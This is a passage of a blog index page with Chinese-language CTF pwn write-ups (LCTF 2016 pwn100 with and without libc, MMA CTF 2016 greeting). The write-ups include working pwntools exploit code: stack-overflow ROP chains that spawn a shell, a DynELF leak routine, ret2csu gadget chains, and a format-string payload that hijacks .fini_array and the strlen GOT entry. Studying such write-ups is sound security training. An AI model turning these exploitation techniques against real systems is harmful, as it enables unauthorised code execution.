canary)</span><br></pre></td></tr></table></div></figure>
+
+<p>(5)栈溢出覆盖返回地址为system，pop rdi传参getshell</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#注释头 </span><br><span class="line"></span><br><span class="line">pop_rdi_ret = libc_base + 0x21102</span><br><span class="line">bin_sh = libc_base + next(libc.search(&#x27;/bin/sh\x00&#x27;))</span><br><span class="line">system_addr = libc_base + libc.symbols[&#x27;system&#x27;]</span><br><span class="line"></span><br><span class="line">payload = &quot;A&quot; * 0x68</span><br><span class="line">payload += p64(canary) # canary</span><br><span class="line">payload += &quot;A&quot; * 0x28</span><br><span class="line">payload += p64(pop_rdi_ret) # return address</span><br><span class="line">payload += p64(bin_sh)</span><br><span class="line">payload += p64(system_addr) # system(&quot;/bin/sh&quot;)</span><br><span class="line"></span><br><span class="line">start_proj(0, payload, 1, 1, 1)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></div></figure>
+
+<p>▲这道题需要很多调试的地方，容易头大崩溃。</p>
+<p>参考资料：</p>
+<p>ctf-all-in-one</p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/LCTF%202016-pwn100_without_libc/">LCTF 2016-pwn100_without_libc</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>1.与之前做的pwn100一模一样，只是之前有给Libc，这次没给Libc。栈溢出，选择用Puts函数来泄露地址从而再执行栈溢出来重复使用。</p>
+<p>2.编写leak函数，由于用Puts函数打印，所以需要有个循环条件，具体原因可以查看之前写的。</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">def leak(addr):</span><br><span class="line">    count = 0</span><br><span class="line">    up = &#x27;&#x27;</span><br><span class="line">    content = &#x27;&#x27;</span><br><span class="line">    payload = &#x27;A&#x27;*72 #padding</span><br><span class="line">    payload += p64(pop_rdi) #给puts()赋值</span><br><span class="line">    payload += p64(addr) #leak函数的参数addr</span><br><span class="line">    payload += p64(puts_addr) #调用puts()函数</span><br><span class="line">    payload += p64(start_addr) #跳转到start，恢复栈</span><br><span class="line">    payload = payload.ljust(200, &#x27;B&#x27;) #padding</span><br><span class="line">    io.send(payload)</span><br><span class="line">    io.recvuntil(&quot;bye~\n&quot;)</span><br><span class="line">    while True: #无限循环读取，防止recv()读取输出不全</span><br><span class="line">        c = io.recv(numb=1, timeout=0.1) #每次读取一个字节，设置超时时间确保没有遗漏</span><br><span class="line">        count += 1</span><br><span class="line">        if up == &#x27;\n&#x27; and c == &quot;&quot;: #上一个字符是回车且读不到其他字符，说明读完了</span><br><span class="line">            data = data[:-1]+&#x27;\x00&#x27; #最后一个字符置为\x00</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            data += c #拼接输出</span><br><span class="line">            up = c #保存最后一个字符</span><br><span class="line">    data = data[:4] #截取输出的一段作为返回值，提供给DynELF处理</span><br><span class="line">log.info(&quot;%#x =&gt; %s&quot; % (addr, (data or &#x27;&#x27;).encode(&#x27;hex&#x27;)))</span><br><span class="line">return data</span><br></pre></td></tr></table></div></figure>
+
+<p>3.得到system_addr的地址后，后续的操作用万能gadget和read函数即可实现。如果还需要其它地址，也可以通过此方法来打印，也是一样的。</p>
+<p>(参照之前不给Libc的pwn100)</p>
+<p>参考资料：</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157" >https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/LCTF%202016-pwn100/">LCTF 2016-pwn100</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>1.常规checksec，开了NX保护。打开IDA，找漏洞，逐次进入后，sub_40068E()函数中的sub_40063D函数中存在栈溢出：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">char v1; // [rsp+0h] [rbp-40h]</span><br><span class="line">---------------------------------------------</span><br><span class="line">sub_40063D((__int64)&amp;v1, 200);</span><br><span class="line">--------------------------------------------------------------------</span><br><span class="line">for ( i = 0; ; ++i )</span><br><span class="line">&#123;</span><br><span class="line">    result = i;</span><br><span class="line">    if ( (signed int)i &gt;= a2 )</span><br><span class="line">      break;</span><br><span class="line">    read(0, (void *)((signed int)i + a1), 1uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p>这里传的是局部变量v1的地址，所以进入sub_40063D后，修改a1指针对应的内存的值其实就是修改之前局部变量v1的值，就是传指针。这个函数每次读取一个字节，直到读取满200字节，其实就可以直接把它当成read(v1,200)完事。</p>
+<p>(题外话：汇编代码中当局部变量传参时，需要用到lea，即：lea   rax, [rbp+var_40]，就是将栈上的变量var_40的地址给rax，然后传参mov   rdi, rax；利用rdi来传函数参数。进入到函数内部后就会有：mov   [rbp+var_18], rdi，也就是在该函数栈上创建一个局部变量来保存传入变量的栈上的地址，也就是之前var_40的栈上地址，保存在[rbp+var_18]这个局部变量中。这是这个程序中，不同程序可能不太一样。)</p>
+<p>2.所以这个栈溢出的覆盖返回地址应该是sub_40068E函数的返回地址，简单远程调试一下，看看v1所在栈地址和rbp下一地址的距离就是偏移量，为0x48，看汇编计算就可以得到0x40+0x8。</p>
+<p>3.现在需要system和binsh，这个程序中这两个都没有带，而只有Libc中才有，但是这个程序并没有泄露Libc的地址。分析程序发现，程序中.plt段中导入了puts函数，IDA中函数名那一块可以看到：所以可以用pwntools中的DynELF，调用该puts函数，从而泄露出libc中puts或者read的地址。由于大多教程选择泄露read，所以这里选择泄露puts函数在Libc中的被加载的地址。这里用read,setbuf,甚至__libc_start_main函数也都可以，因为都导入了plt表和外部引用了。</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191552597.png" alt="img"></p>
+<p>4.开始构造泄露地址的第一段payload:</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">payload = &quot;A&quot;*72            #padding</span><br><span class="line">payload += p64(pop_rdi)      </span><br><span class="line">#由于需要向puts传参，所以用到该地址，可以使用ropgadget</span><br><span class="line">#查询ROPgadget --binary pwn100 | grep &quot;pop rdi ; ret&quot;</span><br><span class="line">#或者在万能gadget中的pop r15，用D命令转换成数据后再C命令转换回代码可以看到</span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">#这是puts在.got表(.got.plt段)中的地址，是传递给Puts函数的参数，当该库函数被加载进入libc中</span><br><span class="line">#时，这样传参进去再打印就可以打印出puts函数在libc中的地址，也就泄露出来了。</span><br><span class="line">payload += p64(puts_addr)</span><br><span class="line">#这是调用puts函数，elf.plt[&#x27;puts&#x27;]（.plt段）</span><br><span class="line">payload += p64(start_addr)</span><br><span class="line">#整个程序的起始代码段，用以恢复栈。这个函数中会调用main函数。这里用Mian函数地#址也可以</span><br><span class="line">payload = payload.ljust(200, b&quot;B&quot;)</span><br><span class="line">#使用B填充200字节中除去先前payload剩余的空间，填充的原因是因为这个程序需要我们输入满200字节</span><br><span class="line">#才会跳出循环，进而才有覆盖返回地址的可能。或者可以写成：</span><br><span class="line">#(payload += &#x27;a&#x27;*(200-0x48-32))</span><br></pre></td></tr></table></div></figure>
+
+<p>5.之后开始运行payload来实际得到Puts函数被libc加载的实际内存地址：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(&#x27;bye~\n&#x27;)#跳出循环后才会执行到打印bye的地方</span><br><span class="line">puts_addr = u64(io.recv()[:-1].ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line">#这里就是接收泄露地址的地方，末尾需要填充上\x00</span><br><span class="line">log.info(&quot;puts_addr = %#x&quot;, puts_addr)</span><br><span class="line">system_addr = puts_addr - 0xb31e0</span><br><span class="line">log.info(&quot;system_addr = %#x&quot;, system_addr)</span><br></pre></td></tr></table></div></figure>
+
+<p>6.现在得到了puts函数被libc加载的实际内存地址，那么puts函数与其它函数的偏移量也就可以通过用IDA打开题目给的libc查出来，从而得到其它我们需要的函数被libc加载的实际内存地址。</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">00000000000456A0  ---system_in_libc</span><br><span class="line">00000000000F8880 ---read_in_libc</span><br><span class="line">0000000000070920  ---puts_in_libc</span><br><span class="line">000000000018AC40 ---binsh_in_libc</span><br></pre></td></tr></table></div></figure>
+
+<p>得到libc被加载的首地址：puts_addr 减去 puts_in_libc 等于libc_start。于是libc_start加上各自函数对应的in_libc也就可以得到被libc加载的实际内存地址。</p>
+<p>7.现在都有了就可以尝试在执行一次栈溢出来开shell，64位程序，有了system函数和binsh地址，那么栈溢出覆盖用pop rdi;ret的方法可以直接getshell。</p>
+<p>8.这里假设没有binsh，来使用一下万能gadget：通过我们的输入读到内存中。同样这张图，万能Gadget1为loc_400616，万能Gadget2为loc_400600</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191552166.png" alt="img"></p>
+<p>以下为用来读取binsh字符串的代码，这里需要在程序中找到一段可以写入之后不会被程序自动修改的内存，也就是binsh_addr=0x60107c，这个地址其实是extern的地址，里面原来保存的内容是read函数发生延迟绑定之前的地址。而延迟绑定发生之后，got表中保存的内容已经被改成了被Libc加载的真实地址，这个extern也就没用了，可以随意用。但如果某个函数没有被首次调用，即还没发生延迟绑定，而我们却先一步改掉了extern的内容，那么它就再也没办法被调用了。</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">binsh_addr = 0x60107c			</span><br><span class="line">#bss放了STDIN和STDOUT的FILE结构体，修改会导致程序崩溃</span><br><span class="line"></span><br><span class="line">payload = b&quot;A&quot;*72</span><br><span class="line">payload += p64(universal_gadget1) #万能gadget1</span><br><span class="line">payload += p64(0) #rbx = 0</span><br><span class="line">payload += p64(1)</span><br><span class="line">#rbp = 1，过掉后面万能gadget2的call返回后的判断,使它步进行跳转，而是顺序执行到万</span><br><span class="line">#能gadget1，从而return到最开始来再执行栈溢出从而Getshell。</span><br><span class="line">#cmp 算术减法运算结果为零,就把ZF(零标志)置1,cmp a b即进行运算a-b</span><br><span class="line">payload += p64(read_got)</span><br><span class="line">#r12 = got表中read函数项，里面是read函数的真正地址，直接通过call调用</span><br><span class="line">payload += p64(8) #r13 = 8，read函数读取的字节数，万能gadget2赋值给rdx</span><br><span class="line">payload += p64(binsh_addr) #r14 = read函数读取/bin/sh保存的地址，万能gadget2赋值给rsi</span><br><span class="line">payload += p64(0)</span><br><span class="line">#r15 = 0，read函数的参数fd，即STDIN，万能gadget2赋值给edi</span><br><span class="line">payload += p64(universal_gadget2) #万能gadget2</span><br><span class="line">payload += b&#x27;\x00&#x27;*56</span><br><span class="line">#万能gadget2后接判断语句，过掉之后是万能gadget1，而Loc_400616万能gadget1执行之</span><br><span class="line">#后会使得栈空间减少7*8个字节，所以我们需要提前输入7*8来使得万能gadget1执行之</span><br><span class="line">#后栈的位置不发生变化，从而能正常ret之后接上的start_addr</span><br><span class="line">#用于填充栈，这里用A也是一样</span><br><span class="line">payload += p64(start_addr) #跳转到start，恢复栈</span><br><span class="line">payload = payload.ljust(200, b&quot;B&quot;) #padding</span><br><span class="line">#不知道这有什么用，去掉一样可以getshell，因为这边是直接调用read函数，而不是经过</span><br><span class="line">#sub_40068E()非得注满200字节才能跳出循环。</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.send(b&quot;/bin/sh\x00&quot;)</span><br><span class="line">#上面的一段payload调用了read函数读取&quot;/bin/sh\x00&quot;，这里发送字符串</span><br><span class="line">#之后回到程序起始位置start</span><br></pre></td></tr></table></div></figure>
+
+<p>这里万能Gadget中给r12赋值，传入的一定是该函数的got表，因为这里的call和常规的call有点不太一样。我们在IDA调试时按下D转换成硬编码形式，(这里可以在IDA中选项-常规-反汇编-操作码字节数设置为8)可以看到这个call的硬编码是FF，而常规的call硬编码是E8。(这里call硬编码之后的字节代表的是合并程序段之前的偏移量，具体可以参考静态编译、动态编译、链接方面的知识)在这个指令集下面：</p>
+<p>FF的call后面跟的是地址的地址。例如call [func], 跳转的地方就应该是func这个地址里保存的内容，也就是*func。</p>
+<p>E8的call后面跟的是地址。例如call func，跳转的地方就是func的开头。</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191552928.jpeg" alt="img"></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191552607.jpeg" alt="img"></p>
+<p>这里可以不用非得看硬编码，可以直接看汇编也可以显示出来：一个有[],一个没有[]。</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191552863.jpeg" alt="img"></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191552842.jpeg" alt="img"></p>
+<p>9.所以万能gadget中通过r12，传入跳转函数的地址只能是发生延迟绑定之后的got表地址，而不能是plt表地址或者是没有发生延迟绑定的got表地址，(延迟绑定只能通过plt表来操作，没有发生延迟绑定之前，该got表中的内容是等同于无效的，只是一个extern段的偏移地址，除非该函数func是静态编译进程序里面的，那么got表中的内容就是该函数的真实有效地址，不会发生延迟绑定。)因为plt表中的内容转换成硬编码压根就不是一个有效地址，更别说跳转到该地址保存的内容的地方了。有人说跳转到plt表执行的就是跳转got表，那应该是一样的啊，但FF的call并不是跳转到plt来执行里面的代码，而是取plt表中内容当作一个地址再跳转到该地址来执行代码，所以有时候需要看汇编代码来决定究竟是传入got表还是传入plt表。同样也可以看到plt表中的硬编码是FF，也就是并不是跳转got表，而是取got表中保存的内容当作一个地址再来跳转。</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191552806.jpeg" alt="img"></p>
+<p>▲说了这么多，记住一个就行了，</p>
+<p>需要跳转函数时，有[]的-只能传got表，没[]的-传plt表(plt表更安全好使，但后面格式化字符串劫持got表又有点不太一样，情况比较复杂)。</p>
+<p>需要打印真实函数地址时，传的一定是got表，这样就一定没错。</p>
+<p>当有call eax;这类语句时，eax中保存的一定得是一个有效地址，因为这里的call硬编码也是0FF。(实际情况got和plt来回调着用呗，哪个好使用哪个)</p>
+<p>10.那么现在有了system_addr和binsh_addr，而程序又是从最开始运行，所以现在尝试getshell：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">payload = b&quot;A&quot;*72 #padding</span><br><span class="line">payload += p64(pop_rdi) #给system函数传参</span><br><span class="line">payload += p64(binsh_addr) #rdi = &amp;(&quot;/bin/sh\x00&quot;)</span><br><span class="line">payload += p64(system_addr) #调用system函数执行system(&quot;/bin/sh&quot;)</span><br><span class="line">payload = payload.ljust(200, b&quot;B&quot;) #padding，跳出循环</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></div></figure>
+
+<p>11.另外由于在libc中查找也比较繁琐，所以有个libcSearch可以简化使用，具体查资料吧。</p>
+<p>▲</p>
+<p>1.往puts函数中传入函数在got表中的地址（elf.got）参数可以打印出被加载在Libc中的实际内存地址。</p>
+<p>2.用覆盖返回地址ret的形式调用函数需要用函数在plt表中的地址，（elf.plt）这是库函数地址，需要先到plt中，然后再到got表中，这是正常的函数调用。</p>
+<p>3.但如果在gadget中，则可以通过给r12赋值来调用elf.got表中的函数，因为这个是call qword ptr[r12+rbx*8]，指向的是函数在got表中真实地址，需要的是函数在got表中的地址。如果只是call addr，则应该是call函数在plt表中的地址。</p>
+<p>4.万能gadget一般在_libc_csu_init中，或者init或者直接ROPgadget查也可以</p>
+<p>▲mov和lea区别：</p>
+<p>mov:对于变量，加不加[]都表示取值；对于寄存器而言，无[]表示取值，有[]表示取地址。</p>
+<p>lea:对于变量，其后面的有无[]皆可，都表示取变量地址，相当于指针。对于寄存器而言，无[]表示取地址，有[]表示取值。</p>
+<p>参考资料：</p>
+<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157" >https://bbs.ichunqiu.com/forum.php?mod=collection&amp;action=view&amp;ctid=157</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/MMA%20CTF%202nd%202016-greeting/">MMA CTF 2nd 2016-greeting</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>1.常规checksec，开了canary和NX。IDA打开找漏洞，main函数中格式化字符串漏洞：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">char v5; // [esp+5Ch] [ebp-44h]</span><br><span class="line">char s; // [esp+1Ch] [ebp-84h]</span><br><span class="line">-----------------------------------------------------</span><br><span class="line">if ( !getnline(&amp;v5, 64) )</span><br><span class="line">sprintf(&amp;s, &quot;Nice to meet you, %s :)\n&quot;, &amp;v5);</span><br><span class="line">return printf(&amp;s);</span><br></pre></td></tr></table></div></figure>
+
+<p>2.再找system，有导入，没有binsh，没有Libc。用格式化字符串修改某个函数的got表指向system函数，然后再次运行程序得以输入binsh传给该函数，相当于调用system函数，之后就可以getshell。但是发现该程序中没有循环，修改之后没办法再次输入。</p>
+<p>3.这里需要用到c语言的结构执行：</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191541317.png" alt="img"></p>
+<p>c语言编译后，执行顺序如图所示，总的来说就是在main函数前会调用.init段代码和.init_array段的函数数组中每一个函数指针。同样的，main函数结束后也会调用.fini段代码和.fini._arrary段的函数数组中的每一个函数指针。</p>
+<p>4.利用Main函数结束时会调用fini段的函数组这一个特点，我们尝试找到fini函数组的地址，利用格式化字符串漏洞来修改该地址，修改.fini_array数组的第一个元素为start，使得Main函数退出时运行该地址可以重复回到start来再次执行一次输入。</p>
+<p>5.fini_array段的地址直接ctrl+s就可以找到，内容是__do_global_dtors_aux_fini_array_entry dd offset __do_global_dtors_aux，保存的内容是一个地址，该地址对应是一个代码段，该代码段的函数名为__do_global_dtors_aux proc near。其它函数对应的got,plt可以通过elf.pot\elf.plt对应的来搜索。</p>
+<p>6.但是这里存在一个问题，要将什么地址劫持为system函数？这个地址必须是在getline最后或者是之后，而且还需要有参数来执行binsh。第一个想到的是sprintf，因为该函数在getline函数之后，并且从右往左数第一个参数就是我们保存的内容，但是尝试过后发现崩溃了，修改是能修改，但是传参的时候有点问题。后面查看该函数汇编代码：</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191541342.jpeg" alt="img"></p>
+<p>可以看到查看该函数从栈上取的第一个参数应该是s这个数组，而不是我们穿的v5，而如果劫持为system函数，那么就要求栈上的esp指向的内容的地址是binsh字符串，但是这里确实指向s这个数组中的内容，为空，那么system函数就没办法调用成功了。后面又看printf函数，还是不行，因为这里printf函数的参数也是s这个数组，内容此时为空，无法顺利调用。之后再找，经过getnline函数内部可以发现有个strlen函数：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">#代码中的形式：</span><br><span class="line">if ( !getnline(&amp;v5, 64) )</span><br><span class="line">----------------------------------------------------------------</span><br><span class="line">getnline(char *s, int n)</span><br><span class="line">return strlen(s);</span><br><span class="line"></span><br><span class="line">#该函数原型：</span><br><span class="line">unsigned int strlen(const char *str);</span><br><span class="line">-------------------------------------------------------</span><br><span class="line">#system函数原型：</span><br><span class="line">int system(const char *command); </span><br></pre></td></tr></table></div></figure>
+
+<p>system函数调用规则是需要一个地址，地址上保存的内容是binsh字符串，或者直接”binsh”字符串赋予，C语言中就代表在全局变量中开辟一块内存，然后该内存保存的是binsh字符串，然后将该内存的地址赋予给system函数当作参数运行。总之就是system函数需要的参数是一个地址。</p>
+<p>这里的strlen满足这个条件，虽然上面写的只是s，但是s中保存的内容是一个地址，输入AAAA，通过调试查看内容：</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191540223.jpeg" alt="img"></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191540170.jpeg" alt="img"></p>
+<p>同样的，查看下汇编代码：</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191540150.jpeg" alt="img"></p>
+<p>可以看到[esp+s]相当于是取s的栈地址赋值给eax，然后eax赋值给esp栈顶，这两行破代码有病，一毛一样。所以现在跳转进strlen中的话，esp的值也就是参数，是一个栈上地址，内容就是AAAA。也就相当于在strlen中的s的值是一个地址，那么劫持后，就相当于system(s)，同样可以getshell。</p>
+<p>▲劫持为system函数，要求原函数的参数也应该是一个地址才行，不然无法跳转。</p>
+<p>7.确定攻击思路后，开始计算偏移，先用IDA简单远程调试，输入AAAA，然后将程序一直运行至printf处，可以看到栈中的偏移为12.5处会出现A的ascii值，也就是41。由于我们需要栈中完整的对应地址，所以需要输入aa填充两个字节，来使得偏移量从12.5到13处，从而能够完整地输入我们需要修改的地址。</p>
+<p>8.之后编写payload，这里使用控制字符%hn(一次改动两个字节)来修改：</p>
+<p>payload = ‘aa’+p32(fini_array_addr+2) + p32(fini_array_addr) + p32(strlen_got+2) + p32(strlen_got) + str(格式化fini+2) + str(格式化fini) + str(格式化strlen_got+2) + str(格式化strlen_got)</p>
+<p>9.之后还得确定输出的值：</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#注释头</span><br><span class="line"></span><br><span class="line">fini_array = 0x08049934</span><br><span class="line">start_addr = 0x080484f0</span><br><span class="line">strlen_got = 0x08049a54</span><br><span class="line">system_plt = 0x08048490</span><br></pre></td></tr></table></div></figure>
+
+<p>查看代码，由于sprintf的作用，printf的参数s保存的不止有我们输入的，还有Nice to meet you,计算加上aa可得总共有8f-7c+1=0x14个，再加上三个32位的地址12字节，总共32字节，也就是0x20。(计算截至为 str(格式化fini+2)处)</p>
+<p>10.另外由于.fini_array的内容为0x080485a0(按d可查看数据)，而我们需要更改的start地址为0x080484f0，所以只需要改动大端序列中的85a0变成84f0即可。所以格式化.fini中需要再输出的字节数应该是0x84f0-0x20=0x84D0=34000。而0x08049934+2处的内容本身就是0804，不需要修改。所以只需要修改.fini_array_addr对应的内容即可，(.fini_array+2对应的内容本身就是0804，不用修改)。所以payload可以删去p32(fini_array_addr+2)和str(格式化fini+2)。</p>
+<p>11.接着计算，需要将strlen_got+2处的值改成0804，由于之前已经输出了0x84f0所以需要用到数据截断。也就是格式化内容中需要再输出的字节数为0x10804-0x84f0=0x8314=33556。</p>
+<p>然后再计算strlen_got的值，需要再输出0x18490-0x10804=0x7c8c=31884。</p>
+<p>故都计算完毕，最后payload为：</p>
+<p>payload = ‘aa’ + p32(fini_array_addr) + p32(strlen_got+2) + p32(strlen_got) + ’%34000c%12$hn’ + ‘%33556c%13$hn’ + ‘%31884c%14$hn’</p>
+<p>12.payload之后，运行完第一次的printf之后，程序会回到start，之后需要再输入字符串io.sendline(‘/bin/sh\x00’)来完整运行system，从而getshell。</p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2021/08/14/Learn_malloc.c_before/">Learn_malloc.c_before</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2021-08-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2021-08-19</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>一、环境部署：</p>
